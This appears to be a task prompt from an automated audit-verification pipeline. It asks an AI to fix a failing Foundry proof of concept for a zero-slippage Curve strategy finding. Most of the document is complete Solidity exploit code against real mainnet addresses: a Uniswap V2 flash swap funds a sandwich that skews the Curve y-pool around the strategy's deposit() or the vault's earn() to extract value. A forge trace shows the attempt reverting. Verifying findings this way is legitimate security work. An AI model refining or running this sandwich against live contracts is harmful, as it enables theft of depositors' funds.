You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Curve deposits and exits execute with zero slippage protection, enabling MEV extraction
- claim: The strategy hardcodes zero minimum outputs for every Curve interaction: `add_liquidity(..., 0)`, `remove_liquidity(..., [0,0,0,0])`, and all three `exchange(..., 0)` calls. As a result, deposits, partial withdrawals, and full migrations will accept whatever execution price exists in the Curve y-pool at that moment.
- impact: A searcher can temporarily skew the Curve pool immediately before `deposit()`, `withdraw(uint)`, or `withdrawAll()`, force the strategy to mint or unwind at a severely unfavorable rate, then back-run the pool to keep the difference. This can extract a material portion of TVL from a single large deposit, withdrawal, or migration.
- exploit_paths: ["deposit() -> add_liquidity([_y,0,0,0], 0)", "withdraw(uint) -> _withdrawSome() -> withdrawUnderlying() -> remove_liquidity(_amount, [0,0,0,0]) -> exchange(..., 0)", "withdrawAll() -> _withdrawAll() -> withdrawUnderlying() -> remove_liquidity(_amount, [0,0,0,0]) -> exchange(..., 0)"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IStrategyDAICurve {
    function deposit() external;
    function controller() external view returns (address);
    function balanceOf() external view returns (uint256);
}

interface IControllerLike {
    function vaults(address token) external view returns (address);
}

interface IYearnTokenLike {
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;
}

interface ICurveYPoolLike {
    function exchange(int128 from, int128 to, uint256 amountIn, uint256 minAmountOut) external;
}

interface IYVaultLike {
    function deposit(uint256 amount) external;
    function withdraw(uint256 shares) external;
    function earn() external;
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address internal constant TARGET = 0xaf274e912243b19B882f02d731dacd7CD13072D0;
    address internal constant CURVE_Y_POOL = 0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51;
    address internal constant UNI_V2_DAI_WETH = 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11;

    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant YDAI = 0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01;
    address internal constant YUSDC = 0xd6aD7a6750A7593E092a9B218d66C0A814a3436e;

    uint256 internal constant MIN_FLASH_DAI = 250_000e18;
    uint256 internal constant MAX_FLASH_DAI = 5_000_000e18;

    enum Route {
        None,
        DirectStrategyDeposit,
        VaultEarnWithIdleVictimFunds,
        VaultSeedThenEarn
    }

    uint256 internal baselineProfitBalance;
    uint256 internal realizedProfit;
    bool internal validated;
    string internal usedPath;
    string internal notes;

    constructor() {}

    function executeOnOpportunity() external {
        _resetOutcome();
        baselineProfitBalance = IERC20Like(DAI).balanceOf(address(this));

        address controller = IStrategyDAICurve(TARGET).controller();
        address vault = controller == address(0) ? address(0) : IControllerLike(controller).vaults(DAI);

        uint256 strategyIdleDai = IERC20Like(DAI).balanceOf(TARGET);
        uint256 vaultIdleDai = vault == address(0) ? 0 : IERC20Like(DAI).balanceOf(vault);
        uint256 strategyMarkedValue = IStrategyDAICurve(TARGET).balanceOf();

        if (strategyIdleDai > 0) {
            uint256 flashAmount = _suggestFlashAmount(strategyIdleDai);
            if (flashAmount > 0) {
                _attemptFlashRoute(
                    Route.DirectStrategyDeposit,
                    flashAmount,
                    address(0),
                    0,
                    "deposit() -> add_liquidity([_y,0,0,0], 0)"
                );
                if (validated) {
                    return;
                }
            }
        }

        if (vault != address(0) && vaultIdleDai > 0) {
            uint256 flashAmount = _suggestFlashAmount(vaultIdleDai);
            if (flashAmount > 0) {
                // Public vault earn() forwards idle vault DAI into the same unsafe
                // strategy.deposit() -> add_liquidity([_y,0,0,0], 0) path from the finding.
                _attemptFlashRoute(
                    Route.VaultEarnWithIdleVictimFunds,
                    flashAmount,
                    vault,
                    0,
                    "vault.earn() -> strategy.deposit() -> add_liquidity([_y,0,0,0], 0)"
                );
                if (validated) {
                    return;
                }
            }
        }

        if (vault != address(0) && strategyMarkedValue > 0) {
            // If no idle victim DAI exists at this block, the attacker can seed the vault with
            // borrowed DAI and then permissionlessly call earn(). The unsafe deposit() loss is
            // socialized across incumbent vault TVL while the attacker keeps the back-run arbitrage.
            uint256 flashAmount = _suggestFlashAmount(strategyMarkedValue / 10);
            uint256 seedAmount = flashAmount / 5;
            if (flashAmount > seedAmount && seedAmount >= 50_000e18) {
                _attemptFlashRoute(
                    Route.VaultSeedThenEarn,
                    flashAmount,
                    vault,
                    seedAmount,
                    "vault.deposit() -> vault.earn() -> strategy.deposit() -> add_liquidity([_y,0,0,0], 0)"
                );
                if (validated) {
                    return;
                }
            }
        }

        notes =
            "No permissionless deposit-stage route realized net DAI at this fork block. "
            "This verifier only uses the finding's deposit-side causality: direct strategy.deposit() when the strategy already holds idle DAI, or the public vault.earn() route that forwards DAI into the same unsafe add_liquidity([_y,0,0,0], 0) call. "
            "The withdraw(uint) and withdrawAll() stages remain controller-only in the strategy itself.";
    }

    function initiateFlashSwap(Route route, uint256 amount, address vault, uint256 seedAmount) external {
        require(msg.sender == address(this), "self only");
        require(amount > 0, "zero amount");

        address token0 = IUniswapV2PairLike(UNI_V2_DAI_WETH).token0();
        address token1 = IUniswapV2PairLike(UNI_V2_DAI_WETH).token1();

        uint256 amount0Out = token0 == DAI ? amount : 0;
        uint256 amount1Out = token1 == DAI ? amount : 0;
        require(amount0Out > 0 || amount1Out > 0, "pair missing DAI");

        IUniswapV2PairLike(UNI_V2_DAI_WETH).swap(
            amount0Out,
            amount1Out,
            address(this),
            abi.encode(route, vault, seedAmount)
        );
    }

    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(msg.sender == UNI_V2_DAI_WETH, "not pair");

        (Route route, address vault, uint256 seedAmount) = abi.decode(data, (Route, address, uint256));
        uint256 borrowedDai = amount0 > 0 ? amount0 : amount1;
        require(borrowedDai > 0, "no DAI borrowed");

        if (route == Route.DirectStrategyDeposit) {
            _executeDirectStrategyDepositSandwich(borrowedDai);
        } else if (route == Route.VaultEarnWithIdleVictimFunds) {
            _executeVaultEarnSandwich(vault, borrowedDai, 0);
        } else if (route == Route.VaultSeedThenEarn) {
            _executeVaultEarnSandwich(vault, borrowedDai, seedAmount);
        } else {
            revert("bad route");
        }

        _safeTransfer(DAI, UNI_V2_DAI_WETH, _flashRepayment(borrowedDai));
    }

    function profitToken() external pure returns (address) {
        return DAI;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfit;
    }

    function hypothesisValidated() external view returns (bool) {
        return validated;
    }

    function exploitPathUsed() external view returns (string memory) {
        return usedPath;
    }

    function outcomeNotes() external view returns (string memory) {
        return notes;
    }

    function _attemptFlashRoute(
        Route route,
        uint256 flashAmount,
        address vault,
        uint256 seedAmount,
        string memory path
    ) internal {
        try this.initiateFlashSwap(route, flashAmount, vault, seedAmount) {
            _finalizeOutcome(path);
        } catch {
            if (bytes(notes).length == 0) {
                notes = "A live flash-funded attempt reverted before realizing net DAI.";
            }
        }
    }

    function _executeDirectStrategyDepositSandwich(uint256 manipulationCapital) internal {
        uint256 yUsdcBefore = IERC20Like(YUSDC).balanceOf(address(this));

        _depositDaiIntoYDai(manipulationCapital);

        uint256 yDaiAmount = IERC20Like(YDAI).balanceOf(address(this));
        _safeApprove(YDAI, CURVE_Y_POOL, yDaiAmount);

        // Front-run the strategy's single-coin Curve deposit by making the pool yDAI-heavy.
        ICurveYPoolLike(CURVE_Y_POOL).exchange(0, 1, yDaiAmount, 0);

        IStrategyDAICurve(TARGET).deposit();

        _unwindCurveSkew(yUsdcBefore);
    }

    function _executeVaultEarnSandwich(address vault, uint256 flashAmount, uint256 seedAmount) internal {
        require(vault != address(0), "no vault");

        if (seedAmount > 0) {
            _safeApprove(DAI, vault, seedAmount);
            IYVaultLike(vault).deposit(seedAmount);
        }

        uint256 manipulationCapital = IERC20Like(DAI).balanceOf(address(this));
        uint256 yUsdcBefore = IERC20Like(YUSDC).balanceOf(address(this));

        _depositDaiIntoYDai(manipulationCapital);

        uint256 yDaiAmount = IERC20Like(YDAI).balanceOf(address(this));
        _safeApprove(YDAI, CURVE_Y_POOL, yDaiAmount);

        // Public vault earn() is the realistic permissionless trigger that routes DAI into the
        // documented vulnerable deposit() -> add_liquidity([_y,0,0,0], 0) sequence.
        ICurveYPoolLike(CURVE_Y_POOL).exchange(0, 1, yDaiAmount, 0);
        IYVaultLike(vault).earn();
        _unwindCurveSkew(yUsdcBefore);

        if (seedAmount > 0) {
            uint256 shares = IERC20Like(vault).balanceOf(address(this));
            if (shares > 0) {
                IYVaultLike(vault).withdraw(shares);
            }
        }

        require(IERC20Like(DAI).balanceOf(address(this)) >= _flashRepayment(flashAmount), "insufficient repay");
    }

    function _depositDaiIntoYDai(uint256 amount) internal {
        require(amount > 0, "no capital");
        _safeApprove(DAI, YDAI, amount);
        IYearnTokenLike(YDAI).deposit(amount);
    }

    function _unwindCurveSkew(uint256 yUsdcBefore) internal {
        uint256 yUsdcAfter = IERC20Like(YUSDC).balanceOf(address(this));
        uint256 yUsdcAmount = yUsdcAfter - yUsdcBefore;
        _safeApprove(YUSDC, CURVE_Y_POOL, yUsdcAmount);

        // Back-run the temporary pool skew and keep the value left behind by the strategy's
        // zero-minimum Curve interaction.
        ICurveYPoolLike(CURVE_Y_POOL).exchange(1, 0, yUsdcAmount, 0);

        uint256 yDaiBalance = IERC20Like(YDAI).balanceOf(address(this));
        IYearnTokenLike(YDAI).withdraw(yDaiBalance);
    }

    function _suggestFlashAmount(uint256 victimAmount) internal view returns (uint256) {
        uint256 daiReserve = _pairDaiReserve();
        if (daiReserve == 0) {
            return 0;
        }

        uint256 desired = victimAmount * 20;
        if (desired < MIN_FLASH_DAI) {
            desired = MIN_FLASH_DAI;
        }
        if (desired > MAX_FLASH_DAI) {
            desired = MAX_FLASH_DAI;
        }

        uint256 maxAvailable = (daiReserve * 30) / 100;
        if (desired > maxAvailable) {
            desired = maxAvailable;
        }

        return desired;
    }

    function _pairDaiReserve() internal view returns (uint256) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(UNI_V2_DAI_WETH).getReserves();
        return IUniswapV2PairLike(UNI_V2_DAI_WETH).token0() == DAI ? uint256(reserve0) : uint256(reserve1);
    }

    function _flashRepayment(uint256 amount) internal pure returns (uint256) {
        return ((amount * 1000) / 997) + 1;
    }

    function _finalizeOutcome(string memory path) internal {
        uint256 current = IERC20Like(DAI).balanceOf(address(this));
        if (current > baselineProfitBalance) {
            realizedProfit = current - baselineProfitBalance;
            if (realizedProfit > 0) {
                validated = true;
                usedPath = path;
                notes = "Net DAI remained after repaying the flashswap.";
            }
        }
    }

    function _resetOutcome() internal {
        baselineProfitBalance = 0;
        realizedProfit = 0;
        validated = false;
        usedPath = "";
        notes = "";
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
    }

    function _callOptionalReturn(address token, bytes memory data) internal {
        (bool ok, bytes memory returndata) = token.call(data);
        require(ok, "token call failed");
        if (returndata.length > 0) {
            require(abi.decode(returndata, (bool)), "token op false");
        }
    }
}

```

forge stdout (tail):
```
 │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │   │        topic 1: 0x00000000000000000000000016de59092dae5ccf4a1e6439d611fd0653f0bd01
    │   │   │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000059d770578dd648b9194c
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 243169836275235442207469 [2.431e23]
    │   │   │   │   │   ├─ [6496] 0xfC1E690f61EFd961294b3e1Ce3313fBD8aa4f85d::balanceOf(0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01) [staticcall]
    │   │   │   │   │   │   ├─ [3312] 0x3dfd23A6c5E8BbcFc9581d2E864a68feb6a076d3::d15e0053(0000000000000000000000006b175474e89094c44da98b954eedeac495271d0f) [staticcall]
    │   │   │   │   │   │   │   ├─ [2569] 0x2847A5D7Ce69790cb40471d454FEB21A0bE1F2e3::d15e0053(0000000000000000000000006b175474e89094c44da98b954eedeac495271d0f) [delegatecall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003d17cc8d34193c20d3d3d5d
    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003d17cc8d34193c20d3d3d5d
    │   │   │   │   │   │   └─ ← [Return] 442188359110421701547003 [4.421e23]
    │   │   │   │   │   ├─ [15172] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::c190c2ec(00000000000000000000000016de59092dae5ccf4a1e6439d611fd0653f0bd0100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003) [staticcall]
    │   │   │   │   │   │   ├─ [2111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::e8177dcf(0000000000000000000000006b175474e89094c44da98b954eedeac495271d0f000000000000000000000000000000000000000000000046b57a9e86f43ce965000000000000000000000000000000000000000000012b8aecc24a55e6d805ee) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000593b4c
    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   ├─ [509] 0x493C57C4763932315A328269E1ADaD09653B9081::balanceOf(0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   ├─ [4773] 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643::balanceOf(0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01) [staticcall]
    │   │   │   │   │   │   ├─ [2257] 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643::0933c1ed(0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002470a0823100000000000000000000000016de59092dae5ccf4a1e6439d611fd0653f0bd0100000000000000000000000000000000000000000000000000000000) [staticcall]
    │   │   │   │   │   │   │   ├─ [600] 0x3363BAe2Fc44dA742Df13CD3ee94b6bB868ea376::balanceOf(0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01) [delegatecall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 424264762046052681980236 [4.242e23]
    │   │   │   │   └─ ← [Revert] insufficient repay
    │   │   │   └─ ← [Revert] insufficient repay
    │   │   └─ ← [Revert] insufficient repay
    │   └─ ← [Return]
    ├─ [256] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x6B175474E89094C44Da98b954EedeAC495271d0F
    ├─ [374] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x6B175474E89094C44Da98b954EedeAC495271d0F)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 17426064 [1.742e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 7904)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifier.uniswapV2Call
  at 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11.swap
  at FlawVerifier.initiateFlashSwap
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 17.19s (17.12s CPU time)

Ran 1 test suite in 17.27s (17.19s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 1727298)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
